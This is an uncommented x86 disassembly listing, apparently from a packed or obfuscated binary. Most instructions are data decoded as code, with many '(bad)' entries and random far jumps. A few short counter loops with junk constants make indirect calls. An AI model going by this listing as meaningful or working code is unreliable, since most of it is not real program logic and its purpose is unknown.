  4127f6:	cmp    edi,esi
  4127f8:	nop
  4127f9:	jecxz  0x412821
  4127fb:	popa   
  4127fc:	les    ebp,FWORD PTR [ebp-0x9]
  4127ff:	imul   BYTE PTR [eax]
  412801:	fwait
  412802:	lds    ecx,FWORD PTR ss:[eax+0x782e5147]
  412809:	in     al,dx
  41280a:	pop    ebx
  41280b:	or     eax,0x33f1b9eb
  412810:	push   ecx
  412811:	pop    ebx
  412812:	imul   eax,DWORD PTR [esi],0x6633b555
  412818:	mov    ch,bl
  41281a:	rcr    DWORD PTR [edx],1
  41281c:	push   es
  41281d:	cmc    
  41281e:	jecxz  0x4127cf
  412820:	faddp  st(1),st
  412822:	push   ds
  412823:	sbb    eax,0x7f1a0fc3
  412828:	les    ebp,FWORD PTR [ebp+0xee9b6c5]
  41282e:	dec    esi
  41282f:	jbe    0x412850
  412831:	and    dh,BYTE PTR [ebp+0x1]
  412834:	mov    al,0x48
  412836:	int3   
  412837:	pop    edx
  412838:	dec    edi
  412839:	pop    ebx
  41283a:	lahf   
  41283b:	sbb    al,0xd2
  41283d:	ror    DWORD PTR [edi+0x3aa2ee79],cl
  412843:	imul   esi,eax,0x93fc270d
  412849:	neg    BYTE PTR [ecx-0x1eca2a0a]
  41284f:	out    dx,al
  412850:	std    
  412851:	add    eax,eax
  412853:	shl    ecx,0x34
  412856:	inc    ebx
  412857:	cdq    
  412858:	pop    ecx
  412859:	ficom  DWORD PTR [ebp+0x33bb8c3b]
  41285f:	xchg   bl,ch
  412861:	xchg   esp,eax
  412862:	push   es
  412863:	sub    BYTE PTR [eax],dh
  412865:	mov    DWORD PTR [ebx+ecx*8],eax
  412868:	fbld   TBYTE PTR [esi]
  41286a:	add    ebx,edx
  41286c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41286d:	mov    ecx,0xca948d7b
  412872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412873:	xor    DWORD PTR [ebp+0x35175d5d],0x5c87de70
  41287d:	mov    bh,0xb6
  41287f:	push   esp
  412880:	hlt    
  412881:	imul   bx,WORD PTR [ebx],0x4d
  412885:	fnstenv [esi]
  412887:	(bad)  
  412889:	es xor al,0x59
  41288c:	call   0xbd36:0xd1a5b52e
  412893:	imul   edx,DWORD PTR [edx+eax*4+0x43],0x360ab814
  41289b:	xlat   BYTE PTR ds:[ebx]
  41289c:	ficomp WORD PTR [eax+0x102f6a6f]
  4128a2:	cs ja  0x4128f9
  4128a5:	sub    DWORD PTR [eax-0x3a9cb918],0x97ec1f11
  4128af:	aas    
  4128b0:	inc    edi
  4128b1:	inc    ebx
  4128b2:	pop    edx
  4128b3:	xchg   DWORD PTR [ebx+eax*1],ecx
  4128b6:	pusha  
  4128b7:	js     0x412840
  4128b9:	cmp    eax,0xcd511b65
  4128be:	and    BYTE PTR [ebp+ebx*2-0x72],bh
  4128c2:	sbb    DWORD PTR [edi-0x21],esi
  4128c5:	dec    ebx
  4128c6:	pop    eax
  4128c7:	dec    eax
  4128c8:	xlat   BYTE PTR ds:[ebx]
  4128c9:	shl    BYTE PTR [esi],cl
  4128cb:	fs test eax,0x1aa3078f
  4128d1:	lea    eax,[ecx-0x4cc30315]
  4128d7:	jns    0x412945
  4128d9:	pop    es
  4128da:	jo     0x412909
  4128dc:	nop
  4128dd:	push   0x0
  4128df:	(bad)  
  4128e0:	jmp    0xd5b6:0xbe4b3e08
  4128e7:	fisubr WORD PTR [ebp+esi*4-0x64]
  4128eb:	imul   edx,DWORD PTR [edi-0x28],0xffffffcb
  4128ef:	xor    esp,esp
  4128f1:	data16 cmp bl,ah
  4128f4:	inc    ecx
  4128f5:	scas   eax,DWORD PTR es:[edi]
  4128f6:	push   esi
  4128f7:	sub    eax,0x58472d47
  4128fc:	xchg   edx,eax
  4128fd:	call   0xd912:0x47515761
  412904:	rcl    BYTE PTR [esi],0x7f
  412907:	js     0x4128ee
  412909:	inc    ecx
  41290a:	sbb    eax,0x5ae6d3d9
  41290f:	stos   DWORD PTR es:[edi],eax
  412910:	cwde   
  412911:	sub    BYTE PTR [esi+0x12],bl
  412914:	sahf   
  412915:	(bad)  
  412916:	xchg   ebx,eax
  412917:	cs ins DWORD PTR es:[edi],dx
  412919:	ss adc al,0x5d
  41291c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41291d:	stos   BYTE PTR es:[edi],al
  41291e:	inc    ebx
  41291f:	nop
  412920:	into   
  412921:	inc    ecx
  412922:	retf   
  412923:	pop    eax
  412924:	leave  
  412925:	dec    ebx
  412926:	lahf   
  412927:	xchg   ebx,eax
  412928:	jns    0x412958
  41292a:	or     ebx,DWORD PTR [eax]
  41292c:	fsub   st(6),st
  41292e:	xor    al,ah
  412930:	sub    DWORD PTR [ecx+0x1490e1a5],ebx
  412936:	sbb    al,0x72
  412938:	jne    0x4128d3
  41293a:	xor    al,0xe9
  41293c:	sar    BYTE PTR [esi+0x1e],0xe4
  412940:	hlt    
  412941:	(bad)
  412944:	jnp    0x412980
  412946:	fiadd  WORD PTR [edx+edx*2]
  412949:	xor    eax,DWORD PTR cs:[eax+0x297ce3fb]
  412950:	scas   eax,DWORD PTR es:[edi]
  412951:	sbb    eax,0xab4d9fb4
  412956:	retf   
  412957:	into   
  412958:	out    0x96,eax
  41295a:	sub    BYTE PTR [ebp-0x57],ch
  41295d:	test   DWORD PTR [edi+0x51078026],esi
  412963:	mov    DWORD PTR [ecx+0xd62d63],esi
  412969:	daa    
  41296a:	dec    ebp
  41296b:	mov    bl,BYTE PTR [esi-0x32]
  41296e:	stos   DWORD PTR es:[edi],eax
  41296f:	sbb    BYTE PTR [esi+ecx*8+0x3cc30cfd],bl
  412976:	and    DWORD PTR [edx-0x4fe4f7ac],edi
  41297c:	test   BYTE PTR [ecx-0x418e848c],dl
  412982:	dec    ecx
  412983:	inc    ebp
  412984:	and    DWORD PTR fs:0x2c43c0c9,ecx
  41298b:	hlt    
  41298c:	es call 0xbb8e0196
  412992:	jl     0x41292d
  412994:	int3   
  412995:	fisttp DWORD PTR [edi-0x4d]
  412998:	cmp    BYTE PTR [eax-0x1fcf7fc],0xd4
  41299f:	dec    esi
  4129a0:	mov    cl,0xb7
  4129a2:	retf   0xe0a1
  4129a5:	inc    ebx
  4129a6:	repz mov eax,0x573a8828
  4129ac:	fdivr  st(7),st
  4129ae:	sti    
  4129af:	test   BYTE PTR [ebx-0x68],0xdf
  4129b3:	(bad)  
  4129b4:	xor    esi,DWORD PTR [eax+eiz*2-0x4c]
  4129b8:	ins    BYTE PTR es:[edi],dx
  4129b9:	retf   
  4129ba:	cmp    cl,BYTE PTR [edi-0x77e445dc]
  4129c0:	push   ds
  4129c1:	pop    ebp
  4129c2:	aas    
  4129c3:	jb     0x412a01
  4129c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c6:	sbb    BYTE PTR [edx-0x37],dl
  4129c9:	mov    WORD PTR [ebx],es
  4129cb:	ret    
  4129cc:	push   es
  4129cd:	jmp    0x4129ad
  4129cf:	and    edi,edi
  4129d1:	nop
  4129d2:	rcl    DWORD PTR [edx],cl
  4129d4:	or     eax,0x4067f621
  4129d9:	call   0x4030:0x2cd2d94e
  4129e0:	jno    0x412a13
  4129e2:	lahf   
  4129e3:	retf   
  4129e4:	mov    bh,0xa2
  4129e6:	stos   BYTE PTR es:[edi],al
  4129e7:	call   DWORD PTR [ecx-0x3e9e9916]
  4129ed:	neg    BYTE PTR [esi+0xb9673dd]
  4129f3:	push   es
  4129f4:	scas   al,BYTE PTR es:[edi]
  4129f5:	sub    eax,esp
  4129f7:	jne    0x4129e4
  4129f9:	out    0x82,eax
  4129fb:	mov    eax,0x956b6aaa
  412a00:	std    
  412a01:	push   ss
  412a02:	mov    ebx,0x3c3ef969
  412a07:	pusha  
  412a08:	push   0xe1d43741
  412a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a0e:	inc    eax
  412a0f:	hlt    
  412a10:	lahf   
  412a11:	int    0x93
  412a13:	aad    0xbb
  412a15:	inc    eax
  412a16:	mov    dl,0x62
  412a18:	and    dl,0x1f
  412a1b:	and    BYTE PTR [ecx+0x34],bh
  412a1e:	adc    eax,0xd88aa640
  412a23:	add    DWORD PTR [edx-0x41aa7ebf],ebx
  412a29:	out    0x3e,eax
  412a2b:	(bad)  
  412a2c:	or     al,0xb1
  412a2e:	add    ebp,esi
  412a30:	clc    
  412a31:	outs   dx,BYTE PTR ds:[esi]
  412a32:	or     dl,bl
  412a34:	mov    DWORD PTR [eax+0x721c4c54],edi
  412a3a:	int3   
  412a3b:	out    dx,eax
  412a3c:	(bad)  
  412a3d:	sbb    cl,BYTE PTR [edx-0xf7cd0c2]
  412a43:	aad    0xb2
  412a45:	add    BYTE PTR [ebp-0x27d1f458],dh
  412a4b:	out    0x10,eax
  412a4d:	jno    0x412a74
  412a4f:	aaa    
  412a50:	push   ebp
  412a51:	xor    al,0x28
  412a53:	mov    esi,0xfbd486bb
  412a58:	icebp  
  412a59:	iret   
  412a5a:	mov    dh,0x67
  412a5c:	(bad)  
  412a5d:	iret   
  412a5e:	inc    eax
  412a5f:	stos   DWORD PTR es:[edi],eax
  412a60:	dec    ebp
  412a61:	sub    bl,BYTE PTR [edi+edx*4-0x7a]
  412a65:	mov    esi,0x1adc4fe
  412a6a:	push   0x34
  412a6c:	jge    0x412a7e
  412a6e:	add    DWORD PTR [edi],edx
  412a70:	je     0x412ad7
  412a72:	icebp  
  412a73:	cwde   
  412a74:	mov    esp,0xa02c428f
  412a79:	ss gs and ecx,esi
  412a7d:	xor    BYTE PTR [ebx+eax*2],0xb2
  412a81:	inc    esi
  412a82:	sbb    ecx,DWORD PTR [edx-0x3c5e2e4d]
  412a88:	pop    edx
  412a89:	sbb    al,0x71
  412a8b:	sti    
  412a8c:	test   al,0x58
  412a8e:	inc    esi
  412a8f:	in     al,0xf
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    dl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fdf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fdf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fdf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e417
  412af1:	mov    edi,DWORD PTR ds:0x42fdf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fdf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e228
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e218,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412ba8
  412b3b:	jg     0x412ac5
  412b3d:	sbb    edx,DWORD PTR [ecx]
  412b3f:	data16 jo 0x412bb2
  412b42:	mov    ecx,0xcc70707e
  412b47:	inc    esi
  412b48:	add    bl,ch
  412b4a:	sub    bl,BYTE PTR [ebx-0x7e]
  412b4d:	jp     0x412ad2
  412b4f:	add    DWORD PTR [edi+ecx*2-0x2ef0fa36],edi
  412b56:	and    dh,BYTE PTR [ebp+0x56]
  412b59:	rol    BYTE PTR [ecx],0xad
  412b5c:	mov    edx,0x131db88d
  412b61:	fistp  QWORD PTR [ebx]
  412b63:	(bad)  
  412b64:	sub    eax,0x4022db85
  412b69:	and    ah,dh
  412b6b:	cld    
  412b6c:	sbb    eax,0x8f72ac28
  412b71:	pop    edi
  412b72:	mov    WORD PTR [ebx],?
  412b74:	or     eax,0xeab179c5
  412b79:	fsubr  QWORD PTR [edx]
  412b7b:	imul   ecx,DWORD PTR [ebp+0x45],0x239f2ed9
  412b82:	push   ds
  412b83:	xor    DWORD PTR [edx],edi
  412b85:	shl    BYTE PTR [edi-0x747de8f2],0x68
  412b8c:	lods   eax,DWORD PTR ds:[esi]
  412b8d:	xchg   BYTE PTR [edi],dl
  412b8f:	leave  
  412b90:	mov    dh,0xa
  412b92:	cmc    
  412b93:	mov    esp,?
  412b95:	in     eax,0x58
  412b97:	pop    edi
  412b98:	aam    0xb6
  412b9a:	and    al,0x4e
  412b9c:	adc    BYTE PTR [ebp+0x6dce6bd3],bl
  412ba2:	dec    edi
  412ba3:	pop    ebx
  412ba4:	inc    esp
  412ba5:	rol    BYTE PTR [ebx+0x59],0xc7
  412ba9:	cmp    DWORD PTR [ebx-0x2e8a49b1],esp
  412baf:	shl    DWORD PTR [edi+ecx*8+0x1937a3c7],cl
  412bb6:	jo     0x412b78
  412bb8:	mov    dl,0x77
  412bba:	inc    esi
  412bbb:	mov    ah,0x78
  412bbd:	pushf  
  412bbe:	leave  
  412bbf:	mov    ecx,0xc9faf9fe
  412bc4:	cmp    esi,DWORD PTR [esi+ecx*8+0x33]
  412bc8:	es pop ecx
  412bca:	mov    DWORD PTR [esi],edi
  412bcc:	push   0x13
  412bce:	pop    ds
  412bcf:	sbb    eax,0x29088d5f
  412bd4:	mov    edx,DWORD PTR [edi]
  412bd6:	daa    
  412bd7:	inc    ebp
  412bd8:	jnp    0x412c35
  412bda:	jmp    0x57a1bc2c
  412bdf:	mov    edi,0xc31830bf
  412be4:	(bad)  
  412be5:	jl     0x412b97
  412be7:	fcmovb st,st(4)
  412be9:	mov    cl,0x56
  412beb:	nop
  412bec:	dec    edi
  412bed:	xchg   esi,eax
  412bee:	dec    esi
  412bef:	div    dh
  412bf1:	adc    al,0xad
  412bf3:	jbe    0x412c2f
  412bf5:	scas   eax,DWORD PTR es:[edi]
  412bf6:	fnstenv [edx]
  412bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf9:	enter  0x83fd,0x4f
  412bfd:	fisttp WORD PTR [ecx+0x50]
  412c00:	jae    0x412c6d
  412c02:	add    eax,0xbdcbd26
  412c07:	fadd   QWORD PTR [edx+0x7aa1e18b]
  412c0d:	pop    ebp
  412c0e:	pop    edx
  412c0f:	add    al,0xa5
  412c11:	or     DWORD PTR [esi],0x5f
  412c14:	pop    esi
  412c15:	inc    ebx
  412c16:	scas   eax,DWORD PTR es:[edi]
  412c17:	sub    al,al
  412c19:	cmc    
  412c1a:	ret    0x5bf8
  412c1d:	cmc    
  412c1e:	gs inc esp
  412c20:	(bad)  
  412c21:	jns    0x412c2e
  412c23:	and    DWORD PTR [eax-0x5f0bbd3],ecx
  412c29:	cli    
  412c2a:	xchg   ebx,eax
  412c2b:	xchg   DWORD PTR [ebx],eax
  412c2d:	fsubr  QWORD PTR [ebx+eiz*2+0x11]
  412c31:	(bad)  
  412c32:	cmp    ch,dl
  412c34:	sbb    BYTE PTR [ebx],ah
  412c36:	dec    ebp
  412c37:	rol    DWORD PTR [edx+esi*1-0x23],0xf3
  412c3c:	jmp    0xbd4f:0x8dc7ccd6
  412c43:	xor    DWORD PTR [edx],ebx
  412c45:	ret    0xba96
  412c48:	push   edx
  412c49:	adc    ebx,edi
  412c4b:	fistp  WORD PTR [esi-0x68]
  412c4e:	push   eax
  412c4f:	jns    0x412ccb
  412c51:	mov    ecx,0xe1ea73a6
  412c56:	das    
  412c57:	(bad)  [ebx-0x333cda26]
  412c5d:	push   ss
  412c5e:	dec    ecx
  412c5f:	rcr    dh,1
  412c61:	dec    esp
  412c62:	or     DWORD PTR [edx+0x17],edi
  412c65:	mov    ch,0x86
  412c67:	je     0x412cba
  412c69:	jl     0x412c8b
  412c6b:	leave  
  412c6c:	mov    DWORD PTR [esi+ecx*2+0x2a],ebp
  412c70:	and    BYTE PTR [edi+0x1f],dh
  412c73:	fbld   TBYTE PTR [edx+edi*4]
  412c76:	mov    esi,0xf2a9425b
  412c7b:	shl    DWORD PTR [ebx+0x62],1
  412c7e:	rcr    dl,1
  412c80:	or     al,0x51
  412c82:	fwait
  412c83:	mov    BYTE PTR [edx],dh
  412c85:	jmp    0x5a7b:0x3da69943
  412c8c:	sbb    BYTE PTR [eax+0x2f],0xf6
  412c90:	shl    BYTE PTR [edx+ebp*4],0xb3
  412c94:	ret    
  412c95:	mov    cl,0x85
  412c97:	xor    ebp,ebx
  412c99:	mov    cl,0x0
  412c9b:	mov    ds:0xeba6d3aa,eax
  412ca0:	pop    edi
  412ca1:	in     al,0xc7
  412ca3:	and    DWORD PTR [esp+ebp*4-0x4e],0x5b
  412ca8:	mov    ds:0xcfbbda1d,al
  412cad:	dec    eax
  412cae:	(bad)  
  412caf:	sub    al,0x6a
  412cb1:	(bad)  
  412cb3:	push   edi
  412cb4:	adc    BYTE PTR ds:[ebx-0x1d],al
  412cb8:	js     0x412c4c
  412cba:	repnz add BYTE PTR [eax-0x6362f2c6],0x9a
  412cc2:	aaa    
  412cc3:	shr    cl,0x8a
  412cc6:	sub    bh,dh
  412cc8:	jecxz  0x412d15
  412cca:	ins    DWORD PTR es:[edi],dx
  412ccb:	jge    0x412c94
  412ccd:	imul   esp,DWORD PTR [esi+0x642fc1dc],0x1c556d35
  412cd7:	xchg   esp,eax
  412cd8:	jo     0x412d3c
  412cda:	sub    al,0x49
  412cdc:	(bad)  
  412cdd:	mov    bl,0x94
  412cdf:	adc    al,0xf5
  412ce1:	pop    edx
  412ce2:	inc    edx
  412ce3:	adc    DWORD PTR [esi],0xf1b1c9cb
  412ce9:	push   ebp
  412cea:	and    cl,cl
  412cec:	icebp  
  412ced:	aaa    
  412cee:	push   0xffffff93
  412cf0:	dec    ebx
  412cf1:	dec    eax
  412cf2:	test   al,0x98
  412cf4:	sbb    al,0x8e
  412cf6:	jecxz  0x412d5d
  412cf8:	enter  0x1d68,0x2b
  412cfc:	sti    
  412cfd:	or     DWORD PTR [ebp+0x15],ebp
  412d00:	mov    BYTE PTR [ecx-0x6a],ch
  412d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d04:	(bad)  
  412d05:	cmp    al,0x0
  412d07:	lds    esp,FWORD PTR [ebx+0x21]
  412d0a:	ret    
  412d0b:	int    0x83
  412d0d:	call   0x3f7ebebc
  412d12:	pop    edi
  412d13:	pop    ss
  412d14:	or     ecx,DWORD PTR [ecx-0x617e104d]
  412d1a:	xchg   ebx,eax
  412d1b:	(bad)  
  412d1c:	sbb    edi,DWORD PTR ds:0x3840b62f
  412d22:	hlt    
  412d23:	jnp    0x412ced
  412d25:	ret    
  412d26:	retf   
  412d27:	imul   ebp,DWORD PTR [ebp-0x219f3d74],0x9c05ff7d
  412d31:	jo     0x412cc6
  412d33:	sub    BYTE PTR ds:0xe01a8d92,0xab
  412d3a:	xor    BYTE PTR [edi+edi*2],al
  412d3d:	cld    
  412d3e:	nop
  412d3f:	cmp    BYTE PTR [eax],dl
  412d41:	push   ebp
  412d42:	bnd jge 0x412ce0
  412d45:	sub    DWORD PTR [edi+0x5],eax
  412d48:	sahf   
  412d49:	call   0x4ec7968e
  412d4e:	outs   dx,BYTE PTR ds:[esi]
  412d4f:	jmp    0xdb23f93f
  412d54:	aad    0x18
  412d56:	test   al,0xfa
  412d58:	mov    al,0x39
  412d5a:	cmp    DWORD PTR [ecx],0x58
  412d5d:	inc    esp
  412d5e:	rsm    
  412d60:	xchg   edi,eax
  412d61:	ret    0x55df
  412d64:	enter  0x5294,0x3b
  412d68:	test   al,0xd6
  412d6a:	cmovnp ebp,ecx
  412d6d:	xor    BYTE PTR [edx-0x658b2837],bh
  412d73:	jp     0x412d96
  412d75:	add    BYTE PTR [ebp-0x71],al
  412d78:	pop    ds
  412d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d7a:	mov    al,BYTE PTR [edx+0x6f]
  412d7d:	dec    ecx
  412d7e:	ds mov dl,0x12
  412d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d82:	add    ch,BYTE PTR ds:0xbee99007
  412d88:	push   cs
  412d89:	adc    eax,0xd353be8f
  412d8e:	call   0x16a363a5
  412d93:	hlt    
  412d94:	lea    ebp,[eax+0x42]
  412d97:	xchg   ebp,eax
  412d98:	jge    0x412d98
  412d9a:	or     DWORD PTR [esi+0x4395e3a9],esi
  412da0:	mov    ds:0xf6ad117d,eax
  412da5:	pop    esi
  412da6:	add    al,0x7d
  412da8:	ror    DWORD PTR [ebp-0x56],0x26
  412dac:	pop    edi
  412dad:	outs   dx,BYTE PTR ds:[esi]
  412dae:	cdq    
  412daf:	retf   0x46d9
  412db2:	push   ss
  412db3:	rcr    DWORD PTR [ecx],1
  412db5:	cdq    
  412db6:	imul   ebp,DWORD PTR [ebx-0x25055f6],0xffffffb0
  412dbd:	push   0x42a29411
  412dc2:	(bad)  
  412dc3:	fisttp WORD PTR [ecx]
  412dc5:	dec    ebp
  412dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dc7:	mov    bl,0x7c
  412dc9:	shl    DWORD PTR [esi],cl
  412dcb:	mov    eax,0x2780b16f
  412dd0:	push   ebp
  412dd1:	mov    al,ds:0xcd9621b0
  412dd6:	push   ecx
  412dd7:	or     ecx,DWORD PTR [ecx-0x31b1a0c4]
  412ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dde:	dec    edx
  412ddf:	xlat   BYTE PTR ds:[ebx]
  412de0:	sbb    al,0x3c
  412de2:	or     BYTE PTR [ebp+esi*2-0x11],dl
  412de6:	push   edi
  412de7:	add    al,0xcf
  412de9:	les    ecx,FWORD PTR [edx-0x43180274]
  412def:	xor    DWORD PTR [ebp-0x41],0x56bc90b8
  412df6:	fldcw  WORD PTR [esi-0x12ceb7f4]
  412dfc:	in     eax,dx
  412dfd:	retf   0x71b3
  412e00:	iretw  
  412e02:	xchg   edx,eax
  412e03:	adc    edi,DWORD PTR [edx]
  412e05:	mov    edx,0x2ba75592
  412e0a:	nop
  412e0b:	xor    eax,0x81ce8765
  412e10:	and    eax,0x42e21c
  412e15:	add    BYTE PTR [eax],al
  412e17:	add    BYTE PTR [eax],al
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e21c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e21c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e21c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e21c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e587
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [esi+0x5ad341ed],di
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x1470707e
  412e82:	nop
  412e83:	push   ecx
  412e84:	inc    ebx
  412e85:	pop    eax
  412e86:	mov    BYTE PTR [eax+0x33281e30],ah
  412e8c:	out    dx,eax
  412e8d:	stc    
  412e8e:	add    DWORD PTR [edx-0x43078e9],eax
  412e94:	outs   dx,DWORD PTR ds:[esi]
  412e95:	dec    ebx
  412e96:	ins    DWORD PTR es:[edi],dx
  412e97:	xchg   edx,eax
  412e98:	jp     0x412eaa
  412e9a:	xchg   edi,eax
  412e9b:	dec    ebp
  412e9c:	pop    edx
  412e9d:	mov    ds:0xeece2581,eax
  412ea2:	sub    eax,DWORD PTR [ebp-0x12]
  412ea5:	leave  
  412ea6:	lods   al,BYTE PTR ds:[esi]
  412ea7:	xchg   esp,eax
  412ea8:	cli    
  412ea9:	add    DWORD PTR [ebp+0x67],esi
  412eac:	jo     0x412ebc
  412eae:	cmp    BYTE PTR [edi+0x26c6c903],al
  412eb4:	push   es
  412eb5:	and    edx,edx
  412eb7:	xchg   ebp,eax
  412eb8:	pop    ebp
  412eb9:	and    DWORD PTR [ebp+0x12],eax
  412ebc:	mov    al,0x45
  412ebe:	push   esp
  412ebf:	loop   0x412e66
  412ec1:	xchg   edx,eax
  412ec2:	mov    ah,cl
  412ec4:	into   
  412ec5:	lea    ecx,[eax-0x3d]
  412ec8:	das    
  412ec9:	test   al,0xb8
  412ecb:	add    BYTE PTR [esi+eiz*4+0x661dad2c],0xc4
  412ed3:	stc    
  412ed4:	cmp    eax,DWORD PTR [edi-0x4a]
  412ed7:	ror    DWORD PTR [esi-0xbd0545c],cl
  412edd:	cmp    DWORD PTR [eax+0x2e92b38f],eax
  412ee3:	dec    eax
  412ee4:	xchg   esi,eax
  412ee5:	(bad)  
  412ee6:	cmp    al,0x16
  412ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ee9:	sbb    eax,0x32ba6bab
  412eee:	adc    eax,0x3720af23
  412ef3:	fidivr DWORD PTR [ebp-0x523ee543]
  412ef9:	pop    esi
  412efa:	push   0xffffffca
  412efc:	es leave 
  412efe:	jns    0x412f31
  412f00:	push   0x2c920fee
  412f05:	fild   QWORD PTR [eax+0x8a2749a]
  412f0b:	es fst st(0)
  412f0e:	and    BYTE PTR [ecx+0xb4bb697],0xa5
  412f15:	xor    eax,0xb2bd62ee
  412f1a:	cs out dx,al
  412f1c:	jl     0x412f8a
  412f1e:	das    
  412f1f:	les    esi,FWORD PTR [edi+0x3da0a075]
  412f25:	arpl   sp,bp
  412f27:	xor    al,0x17
  412f29:	xlat   BYTE PTR ds:[ebx]
  412f2a:	(bad)  
  412f2b:	or     eax,0xdab310d3
  412f30:	xor    esp,esi
  412f32:	das    
  412f33:	dec    edi
  412f34:	inc    ecx
  412f35:	xchg   ebx,eax
  412f36:	xchg   edi,eax
  412f37:	loop   0x412f8b
  412f39:	and    al,0x55
  412f3b:	(bad)  
  412f3c:	pop    ebx
  412f3d:	or     edx,DWORD PTR [esi-0x76]
  412f40:	pusha  
  412f41:	push   cs
  412f42:	out    0x4,al
  412f44:	or     DWORD PTR [ebp-0x65],esi
  412f47:	adc    eax,0x34dc1101
  412f4c:	enter  0xbac4,0xd1
  412f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f52:	imul   esp,DWORD PTR [ebx],0xffffff83
  412f55:	mov    ebp,0x7c81a1bf
  412f5a:	leave  
  412f5b:	retf   
  412f5c:	stos   BYTE PTR es:[edi],al
  412f5d:	outs   dx,BYTE PTR ds:[esi]
  412f5e:	adc    BYTE PTR [ebx-0x3b],cl
  412f61:	or     eax,0x7d3f0f1b
  412f66:	jecxz  0x412f2d
  412f68:	les    edi,FWORD PTR [ebx+0x4]
  412f6b:	sub    esp,DWORD PTR [edi-0x294efbbb]
  412f71:	or     ah,BYTE PTR [ebp+0x48]
  412f74:	and    edx,DWORD PTR [edx-0x38da32fc]
  412f7a:	les    esi,FWORD PTR [eax]
  412f7c:	sub    al,BYTE PTR [ecx+0xb]
  412f7f:	call   FWORD PTR [ecx-0x27b75335]
  412f85:	icebp  
  412f86:	ror    DWORD PTR [ecx+ebp*2-0x6b],0x0
  412f8b:	es sub al,dl
  412f8e:	jecxz  0x412f88
  412f90:	mov    ds:0x43fe7f29,eax
  412f95:	sbb    eax,0x11dd576
  412f9a:	sti    
  412f9b:	xor    eax,0x12a5321c
  412fa0:	int3   
  412fa1:	jmp    0x8c5ea13d
  412fa6:	fcmovbe st,st(0)
  412fa8:	outs   dx,DWORD PTR ds:[esi]
  412fa9:	or     BYTE PTR [eax+0x11],0x98
  412fad:	aad    0x37
  412faf:	add    eax,0xa9daf413
  412fb4:	jmp    0xb190:0x2547
  412fba:	or     dl,BYTE PTR [esi-0x1c0d6cdd]
  412fc0:	stc    
  412fc1:	lds    bx,DWORD PTR [ebp+eax*2+0x7c]
  412fc6:	add    al,0x70
  412fc8:	push   0x73
  412fca:	dec    esi
  412fcb:	aas    
  412fcc:	es in  al,0x11
  412fcf:	xchg   ebx,eax
  412fd0:	mov    ds:0x7a9ef960,eax
  412fd5:	or     ecx,DWORD PTR [ebp-0x18]
  412fd8:	fist   WORD PTR [ebp+0x4951c441]
  412fde:	je     0x412fbc
  412fe0:	cmp    bh,ah
  412fe2:	dec    edi
  412fe3:	push   edi
  412fe4:	daa    
  412fe5:	mov    edx,0x8c121e74
  412fea:	scas   eax,DWORD PTR es:[edi]
  412feb:	lods   al,BYTE PTR ds:[esi]
  412fec:	cmp    bh,BYTE PTR [ebx-0x3d]
  412fef:	fcom   QWORD PTR [ebx]
  412ff1:	loopne 0x412fe2
  412ff3:	and    eax,0xc698d0f9
  412ff9:	rcr    edx,1
  412ffb:	fcmove st,st(3)
  412ffd:	mov    esp,0x3431292f
  413002:	bound  esp,QWORD PTR [ebx+ebp*4+0x62]
  413006:	mov    BYTE PTR [esi],dh
  413008:	cld    
  413009:	or     al,ch
